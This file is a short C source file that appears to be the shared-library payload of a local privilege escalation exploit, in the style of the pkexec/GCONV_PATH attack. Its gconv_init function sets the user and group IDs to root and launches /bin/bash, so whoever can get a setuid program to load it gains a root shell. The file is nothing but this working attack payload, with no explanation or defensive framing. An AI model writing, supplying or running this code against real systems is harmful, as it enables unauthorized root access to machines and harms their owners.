#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void gconv(){}
void gconv_init()
{
    char *shell = {"/bin/bash"};
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execve(shell, NULL, NULL);
}
